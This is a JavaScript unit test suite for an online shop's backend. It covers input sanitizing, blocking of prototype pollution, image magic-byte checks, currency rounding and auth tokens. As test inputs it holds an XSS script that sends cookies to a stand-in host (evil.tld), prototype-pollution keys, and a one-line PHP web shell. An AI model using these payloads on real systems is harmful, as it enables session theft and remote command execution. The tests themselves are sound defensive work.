const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const {
  sanitizeString,
  sanitizeValue,
} = require('../../backend/middlewares/sanitize.middleware');
const { verifyImageMagicBytes } = require('../../backend/middlewares/upload.middleware');
const { roundCurrency } = require('../../backend/services/cart.service');
const {
  hashRefreshToken,
  generateAccessToken,
} = require('../../backend/services/auth.service');

describe('Unit Suite: Security Sanitizers, Magic-Byte Verifier & Financial Math', () => {
  it('strips <script> tags, inline event handlers, and javascript: URIs', () => {
    const malicious =
      'Hello <script>fetch("http://evil.tld?c="+document.cookie)</script><img src="x" onerror="alert(1)"> <a href="javascript:alert(2)">Click</a>';
    const cleaned = sanitizeString(malicious);

    assert.equal(cleaned.includes('<script'), false);
    assert.equal(cleaned.includes('onerror='), false);
    assert.equal(cleaned.includes('javascript:'), false);
  });

  it('prevents prototype pollution keys while preserving raw password strings', () => {
    const rawPayload = JSON.parse(
      '{"name":"<b>Alice</b>","password":"My<Pass>123!","__proto__":{"isAdmin":true},"constructor":{"prototype":{"polluted":true}}}'
    );
    const cleaned = sanitizeValue(rawPayload);

    assert.equal(cleaned.name, '&lt;b&gt;Alice&lt;/b&gt;');
    assert.equal(cleaned.password, 'My<Pass>123!');
    assert.equal(Object.prototype.hasOwnProperty.call(cleaned, '__proto__'), false);
    assert.equal(({}).isAdmin, undefined);
    assert.equal(({}).polluted, undefined);
  });

  it('verifies true JPEG, PNG, and WebP magic bytes and rejects disguised executables/scripts', () => {
    // Valid PNG magic header (89 50 4E 47 0D 0A 1A 0A ...)
    const validPng = Buffer.from([
      0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d,
    ]);
    assert.equal(verifyImageMagicBytes(validPng), '.png');

    // Valid JPEG magic header (FF D8 FF E0 ...)
    const validJpg = Buffer.from([
      0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01,
    ]);
    assert.equal(verifyImageMagicBytes(validJpg), '.jpg');

    // Valid WebP magic header ("RIFF" + 4 bytes + "WEBP")
    const validWebp = Buffer.from('RIFF\x00\x00\x00\x00WEBP', 'ascii');
    assert.equal(verifyImageMagicBytes(validWebp), '.webp');

    // Disguised PHP Web Shell renamed to .jpg
    const phpShell = Buffer.from('<?php system($_GET["cmd"]); ?>', 'utf8');
    assert.equal(verifyImageMagicBytes(phpShell), null);

    // Disguised Windows PE Executable (MZ...)
    const exeBuffer = Buffer.from('MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff', 'binary');
    assert.equal(verifyImageMagicBytes(exeBuffer), null);
  });

  it('rounds financial currency values accurately without floating-point drift', () => {
    assert.equal(roundCurrency(0.1 + 0.2), 0.3);
    assert.equal(roundCurrency(495 * 0.14), 69.3);
    assert.equal(roundCurrency(19.995), 20);
  });

  it('generates deterministic SHA-256 refresh token hashes and valid JWT access tokens', () => {
    const hash1 = hashRefreshToken('sample-refresh-token-value');
    const hash2 = hashRefreshToken('sample-refresh-token-value');
    assert.equal(hash1, hash2);
    assert.equal(hash1.length, 64);

    const token = generateAccessToken({
      id: 'usr-test-1',
      email: 'test@aura-atelier.com',
      role: 'customer',
      name: 'Test Collector',
    });
    assert.equal(typeof token, 'string');
    assert.equal(token.split('.').length, 3);
  });
});
